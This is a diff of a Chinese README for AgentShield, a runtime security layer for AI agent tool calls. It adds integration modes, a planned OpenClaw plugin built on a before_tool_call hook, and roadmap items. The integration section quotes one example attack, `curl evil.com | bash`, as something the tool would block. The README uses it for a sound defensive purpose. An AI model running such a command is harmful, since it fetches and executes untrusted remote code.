@@ -267,11 +267,78 @@ make docker-build
 | [信任模型](configs/default_policy.yaml) | 默认信任策略和权限矩阵 |
 | [内置规则](configs/builtin_rules.yaml) | 全部 22 条内置安全规则 |
 
+## 接入方式
+
+AgentShield 目前提供三种接入方式，更多方式正在规划中：
+
+| 模式 | 工作原理 | 代码改动 |
+|------|---------|---------|
+| **SDK 嵌入** | 引入 SDK，用 `@shield.guard` 或 `shield.session()` 包装工具调用 | 极少 |
+| **框架适配器** | LangChain、CrewAI、AutoGen、Claude Agent SDK 的一行式集成 | 一行 |
+| **Sidecar 代理** | 在 Agent 和工具之间部署代理，Agent 代码零改动 | 无 |
+
+三种模式底层都调用同一个 Core Engine 做安全决策。
+
+### 规划中：OpenClaw 插件
+
+[OpenClaw](https://openclaw.ai) 是一个开源的本地化个人 AI 助手，连接 50+ 工具（邮件、Shell、浏览器、文件系统等），跨多个聊天平台运行。它的 Agent 可以自主执行 Shell 命令、写文件、调 API —— 正是这类强大但高风险的操作最需要运行时安全层。
+
+**为什么 OpenClaw + AgentShield 是天然搭档：**
+
+OpenClaw 已经有分层安全模型（沙箱模式、工具策略、exec 审批），但这些是静态的、基于配置的控制。它们回答的是"这个工具是否被允许？"，而不是"这次工具调用在当前 Agent 意图下是否合理？" —— 这正是 AgentShield 填补的空白。用户可以在工具策略中允许 `exec`，但仍然希望 AgentShield 在处理外部数据时阻止 `curl evil.com | bash`。
+
+**如何实现：**
+
+OpenClaw 的 [Plugin SDK](https://docs.openclaw.ai/plugins/architecture.md) 在 Agent 循环的每个阶段暴露生命周期钩子。AgentShield 插件将注册在 `before_tool_call` 钩子上 —— 该钩子支持 `{ block: true }` 终端决策 —— 在每次工具调用执行前进行拦截：
+
+```
+OpenClaw Agent 循环：
+  用户消息 → 提示构建 → 模型推理 → 工具调用
+                                        │
+                                ┌───────▼────────┐
+                                │  before_tool_call │
+                                │  (AgentShield)    │
+                                │                   │
+                                │  → ALLOW          │
+                                │  → BLOCK          │
+                                │  → CONFIRM        │
+                                └───────────────────┘
+                                        │
+                                工具执行（或被阻止）
+```
+
+插件将：
+
+1. **`before_tool_call`** —— 将工具名、参数和会话上下文发送给 AgentShield Core Engine 获取安全决策。引擎返回 BLOCK 则阻止；ALLOW 则放行；REQUIRE_CONFIRMATION 则向用户弹出确认。
+2. **`before_prompt_build`** —— 向系统提示注入信任等级标记，让引擎知道数据上下文（例如：正在处理外部邮件 vs. 用户直接输入）。
+3. **`after_tool_call`** —— 将工具执行结果记录到 AgentShield 追踪引擎，形成 Merkle 可审计的历史记录。
+
+这意味着 OpenClaw 用户只需启用一个插件就能获得 AgentShield 保护 —— 无需修改 Agent 配置、技能或工具。
+
+**我们需要你的帮助来构建它。** 如果你熟悉 OpenClaw Plugin SDK，请查看[贡献指南](CONTRIBUTING_ZH.md)并提交 issue 讨论实现方案。
+
+### 想要添加新的集成？
+
+AgentShield 的架构设计为 Agent 无关 —— 只要有工具调用的地方，就有安全检查的切入点。我们欢迎社区贡献新的集成目标：
+
+| 平台 | 集成切入点 | 状态 |
+|------|-----------|------|
+| **OpenClaw** | Plugin SDK `before_tool_call` 钩子 | 规划中 — 欢迎贡献 |
+| **MCP（模型上下文协议）** | MCP Server 的工具守卫中间件 | 规划中 |
+| **API 网关**（Kong、Envoy） | 自定义 filter / 插件 | 规划中 |
+| **OpenTelemetry** | 用于安全 span 注入的 Trace Processor | 规划中 |
+| **Webhook / 事件驱动** | 适用于任何支持 HTTP 回调的系统的被动审计模式 | 规划中 |
+
+如果你使用的 Agent 框架、编排器或工具平台不在列表中，请[提交 issue](https://github.com/YOUR_ORG/agentshield/issues) —— 我们会帮你找到 AgentShield 的接入点。
+
 ## 路线图
 
+- [ ] OpenClaw 插件集成
+- [ ] MCP（模型上下文协议）工具守卫
 - [ ] OpenTelemetry 原生 trace 导出
 - [ ] Grafana 仪表盘模板
 - [ ] Kubernetes Helm Chart
+- [ ] API 网关插件（Kong、Envoy）
 - [ ] Java / Rust SDK
 - [ ] 自定义检测引擎插件系统
 - [ ] WebSocket 实时告警推送
@@ -279,6 +346,8 @@ make docker-build
 - [ ] REGO / OPA 策略集成
 
 ## 贡献
+
+我们正在构建 AI Agent 生态系统中缺失的安全层。无论是新的框架集成、我们尚未覆盖的攻击向量检测规则，还是更好的追踪可视化方案 —— 我们都需要你的参与。
 
 请参阅 [CONTRIBUTING.md](CONTRIBUTING.md) 和 [CONTRIBUTING_ZH.md](CONTRIBUTING_ZH.md)。
 
